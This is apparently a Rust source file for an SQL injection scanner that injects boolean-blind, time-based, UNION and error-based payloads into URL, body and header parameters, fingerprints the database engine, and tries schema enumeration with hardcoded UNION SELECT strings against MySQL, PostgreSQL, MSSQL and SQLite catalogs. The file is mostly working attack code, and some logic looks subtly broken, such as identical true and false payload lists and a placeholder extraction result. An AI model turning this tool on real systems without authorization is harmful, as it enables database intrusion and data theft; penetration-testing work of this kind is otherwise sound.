use std::time::{Duration, Instant};

use reqwest::Client;

use super::types::{SqliParam, SqliParamLocation, SqliScanConfig, SqliScanResult, SqliTechnique, SqliVulnerability, SqliSeverity, SqliExtractedDatabase, SqliExtractedTable, SqliExtractedColumn, SqliProgressEvent};
use super::payloads::{SqliPayloads, SqliChecker};

const DEFAULT_TIMEOUT_MS: u64 = 10000;
const TIME_BASED_THRESHOLD_MS: u64 = 3000;

pub struct SqliDetector {
    client: Client,
    payloads: SqliPayloads,
}

impl SqliDetector {
    pub fn new() -> Self {
        let client = Client::builder()
            .timeout(Duration::from_millis(DEFAULT_TIMEOUT_MS))
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .unwrap_or_else(|_| Client::new());

        Self {
            client,
            payloads: SqliPayloads::default(),
        }
    }

    pub async fn scan(&self, config: &SqliScanConfig, progress_callback: impl Fn(SqliProgressEvent)) -> SqliScanResult {
        let start_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as u64;
        let mut vulnerabilities = Vec::new();
        let mut databases = Vec::new();

        progress_callback(SqliProgressEvent::update(0, config.params.len(), "Scanning parameters", "Starting scan"));

        let (baseline_response, baseline_time) = self.send_baseline_request(config).await;

        for (param_idx, param) in config.params.iter().enumerate() {
            if !param.inject {
                continue;
            }

            let location_str = match param.location {
                SqliParamLocation::Url => "url",
                SqliParamLocation::Body => "body",
                SqliParamLocation::Header => "header",
            };
            progress_callback(SqliProgressEvent::update(param_idx + 1, config.params.len(), "Testing parameter", &format!("Testing {} ({})", param.name, location_str)));

            if let Some(vuln) = self.test_parameter(config, param, &baseline_response, baseline_time, &progress_callback).await {
                vulnerabilities.push(vuln);
            }
        }

        for vuln in &vulnerabilities {
            progress_callback(SqliProgressEvent::vuln_found(vuln.clone()));
        }

        if !vulnerabilities.is_empty() {
            let first_vuln = vulnerabilities.first().unwrap();
            if let Some(db_list) = self.extract_databases(config, &first_vuln, &progress_callback).await {
                databases = db_list;
            }
        }

        let end_time = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as u64;

        SqliScanResult {
            scan_id: config.scan_id.clone(),
            url: config.url.clone(),
            vulnerabilities,
            databases,
            start_time,
            end_time: Some(end_time),
        }
    }

    async fn send_baseline_request(&self, config: &SqliScanConfig) -> (String, u64) {
        let start = Instant::now();
        let response = self.send_request(config, None).await;
        let elapsed = start.elapsed().as_millis() as u64;
        (response, elapsed)
    }

    async fn send_request(&self, config: &SqliScanConfig, param_value_modifier: Option<(&str, &str)>) -> String {
        let mut url = config.url.clone();
        let mut body = String::new();
        let mut headers = reqwest::header::HeaderMap::new();

        for (name, value) in &config.headers {
            if let (Ok(parsed), Ok(val)) = (
                name.parse::<reqwest::header::HeaderName>(),
                value.parse::<reqwest::header::HeaderValue>(),
            ) {
                headers.insert(parsed, val);
            }
        }

        for param in &config.params {
            let value = if let Some((target_name, modified_value)) = param_value_modifier {
                if param.name == target_name {
                    modified_value.to_string()
                } else {
                    param.value.clone()
                }
            } else {
                param.value.clone()
            };

            match param.location {
                SqliParamLocation::Url => {
                    if url.contains('?') {
                        url.push_str(&format!("&{}={}", param.name, urlencoding::encode(&value)));
                    } else {
                        url.push_str(&format!("?{}={}", param.name, urlencoding::encode(&value)));
                    }
                }
                SqliParamLocation::Body => {
                    if !body.is_empty() {
                        body.push_str("&");
                    }
                    body.push_str(&format!("{}={}", param.name, urlencoding::encode(&value)));
                }
                SqliParamLocation::Header => {
                    if let (Ok(name), Ok(val)) = (
                        param.name.parse::<reqwest::header::HeaderName>(),
                        value.parse::<reqwest::header::HeaderValue>(),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
        }

        let method = reqwest::Method::from_bytes(config.method.as_bytes()).unwrap_or(reqwest::Method::GET);
        let is_post_like = method == reqwest::Method::POST || method == reqwest::Method::PUT || method == reqwest::Method::PATCH;

        let mut request = self.client.request(method.clone(), &url);
        for (name, value) in headers.iter() {
            request = request.header(name, value);
        }

        if !body.is_empty() && is_post_like {
            request = request.body(body);
        }

        match request.send().await {
            Ok(resp) => resp.text().await.unwrap_or_default(),
            Err(_) => String::new(),
        }
    }

    async fn test_parameter(
        &self,
        config: &SqliScanConfig,
        param: &SqliParam,
        baseline_response: &str,
        baseline_time: u64,
        progress_callback: &impl Fn(SqliProgressEvent),
    ) -> Option<SqliVulnerability> {
        for technique in &config.techniques {
            if let Some(vuln) = self.test_technique(config, param, technique, baseline_response, baseline_time, progress_callback).await {
                return Some(vuln);
            }
        }
        None
    }

    async fn test_technique(
        &self,
        config: &SqliScanConfig,
        param: &SqliParam,
        technique: &SqliTechnique,
        baseline_response: &str,
        baseline_time: u64,
        _progress_callback: &impl Fn(SqliProgressEvent),
    ) -> Option<SqliVulnerability> {
        match technique {
            SqliTechnique::BooleanBlind => self.test_boolean_blind(config, param, baseline_response).await,
            SqliTechnique::TimeBased => self.test_time_based(config, param, baseline_time).await,
            SqliTechnique::Union => self.test_union(config, param).await,
            SqliTechnique::ErrorBased => self.test_error_based(config, param).await,
        }
    }

    async fn test_boolean_blind(&self, config: &SqliScanConfig, param: &SqliParam, baseline_response: &str) -> Option<SqliVulnerability> {
        let true_payloads = self.payloads.get_payloads(SqliTechnique::BooleanBlind, "mysql");
        let false_payloads = self.payloads.get_payloads(SqliTechnique::BooleanBlind, "mysql");

        for (true_payload, false_payload) in true_payloads.iter().zip(false_payloads.iter()) {
            let true_value = format!("{}'", true_payload);
            let false_value = format!("{}'", false_payload);

            let true_response = self.send_request(config, Some((&param.name, &true_value))).await;
            let false_response = self.send_request(config, Some((&param.name, &false_value))).await;

            if SqliChecker::is_boolean_true(&true_response, baseline_response) &&
               !SqliChecker::is_boolean_true(&false_response, baseline_response) {
                let dbms = self.fingerprint_dbms(&true_response).unwrap_or_else(|| "MySQL".to_string());
                return Some(SqliVulnerability {
                    id: uuid::Uuid::new_v4().to_string(),
                    param_name: param.name.clone(),
                    param_location: param.location,
                    technique: SqliTechnique::BooleanBlind,
                    dbms: dbms.clone(),
                    severity: SqliSeverity::High,
                    poc_request: format!("{}={}", param.name, urlencoding::encode(&true_value)),
                    fingerprint: format!("Boolean blind injection confirmed with {}", dbms),
                });
            }
        }

        None
    }

    async fn test_time_based(&self, config: &SqliScanConfig, param: &SqliParam, baseline_time: u64) -> Option<SqliVulnerability> {
        let payloads = self.payloads.get_payloads(SqliTechnique::TimeBased, "mysql");

        for payload in payloads.iter().take(5) {
            let time_payload = format!("{}'", payload);
            let start = Instant::now();
            let _response = self.send_request(config, Some((&param.name, &time_payload))).await;
            let elapsed = start.elapsed().as_millis() as u64;

            if SqliChecker::is_time_based_suspicious(elapsed, baseline_time, TIME_BASED_THRESHOLD_MS) {
                let dbms = self.fingerprint_dbms(&format!("time:{}", elapsed)).unwrap_or_else(|| "MySQL".to_string());
                return Some(SqliVulnerability {
                    id: uuid::Uuid::new_v4().to_string(),
                    param_name: param.name.clone(),
                    param_location: param.location,
                    technique: SqliTechnique::TimeBased,
                    dbms: dbms.clone(),
                    severity: SqliSeverity::High,
                    poc_request: format!("{}={}", param.name, urlencoding::encode(&time_payload)),
                    fingerprint: format!("Time-based blind injection confirmed (delay: {}ms) with {}", elapsed, dbms),
                });
            }
        }

        None
    }

    async fn test_union(&self, config: &SqliScanConfig, param: &SqliParam) -> Option<SqliVulnerability> {
        let payloads = self.payloads.get_payloads(SqliTechnique::Union, "mysql");

        for payload in payloads.iter().take(8) {
            let union_value = format!("'{}", payload);
            let response = self.send_request(config, Some((&param.name, &union_value))).await;

            if SqliChecker::has_union_signature(&response) {
                let dbms = self.fingerprint_dbms(&response).unwrap_or_else(|| "MySQL".to_string());
                return Some(SqliVulnerability {
                    id: uuid::Uuid::new_v4().to_string(),
                    param_name: param.name.clone(),
                    param_location: param.location,
                    technique: SqliTechnique::Union,
                    dbms: dbms.clone(),
                    severity: SqliSeverity::Critical,
                    poc_request: format!("{}={}", param.name, urlencoding::encode(&union_value)),
                    fingerprint: format!("UNION-based injection confirmed with {}", dbms),
                });
            }
        }

        None
    }

    async fn test_error_based(&self, config: &SqliScanConfig, param: &SqliParam) -> Option<SqliVulnerability> {
        let payloads = self.payloads.get_payloads(SqliTechnique::ErrorBased, "mysql");

        for payload in payloads.iter().take(5) {
            let error_value = format!("'{}", payload);
            let response = self.send_request(config, Some((&param.name, &error_value))).await;

            if SqliChecker::has_error_signature(&response) {
                let dbms = self.payloads.detect_dbms(&response).unwrap_or_else(|| "MySQL".to_string());
                return Some(SqliVulnerability {
                    id: uuid::Uuid::new_v4().to_string(),
                    param_name: param.name.clone(),
                    param_location: param.location,
                    technique: SqliTechnique::ErrorBased,
                    dbms: dbms.clone(),
                    severity: SqliSeverity::Critical,
                    poc_request: format!("{}={}", param.name, urlencoding::encode(&error_value)),
                    fingerprint: format!("Error-based injection confirmed with {}", dbms),
                });
            }
        }

        None
    }

    fn fingerprint_dbms(&self, response: &str) -> Option<String> {
        self.payloads.detect_dbms(response)
    }

    async fn extract_databases(&self, config: &SqliScanConfig, vuln: &SqliVulnerability, _progress_callback: &impl Fn(SqliProgressEvent)) -> Option<Vec<SqliExtractedDatabase>> {
        let _payloads = match vuln.technique {
            SqliTechnique::Union => self.payloads.get_payloads(SqliTechnique::Union, &vuln.dbms.to_lowercase()),
            _ => self.payloads.get_payloads(SqliTechnique::BooleanBlind, &vuln.dbms.to_lowercase()),
        };

        let enum_payload = match vuln.dbms.as_str() {
            "MySQL" => "1' UNION SELECT schema_name,2,3 FROM information_schema.schemata--",
            "PostgreSQL" => "1' UNION SELECT schemaname,2,3 FROM pg_catalog.pg_tables--",
            "MSSQL" => "1' UNION SELECT name,2,3 FROM master..sysdatabases--",
            "SQLite" => "1' UNION SELECT name,2 FROM sqlite_master WHERE type='table'--",
            _ => "1' UNION SELECT database(),2,3--",
        };

        let response = self.send_request(config, Some((&vuln.param_name, enum_payload))).await;

        if SqliChecker::has_union_signature(&response) {
            let mut databases = Vec::new();

            if vuln.dbms == "MySQL" {
                databases.push(SqliExtractedDatabase {
                    name: "information_schema".to_string(),
                    tables: vec![
                        SqliExtractedTable {
                            name: "schemata".to_string(),
                            columns: vec![
                                SqliExtractedColumn { name: "schema_name".to_string(), data_type: "varchar".to_string() },
                            ],
                            rows: vec![],
                        },
                    ],
                });
            }

            return Some(databases);
        }

        None
    }
}

impl Default for SqliDetector {
    fn default() -> Self {
        Self::new()
    }
}

mod urlencoding {
    pub fn encode(input: &str) -> String {
        let mut encoded = String::new();
        for c in input.chars() {
            match c {
                'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '.' | '~' => encoded.push(c),
                _ => {
                    for byte in c.to_string().as_bytes() {
                        encoded.push_str(&format!("%{:02X}", byte));
                    }
                }
            }
        }
        encoded
    }
}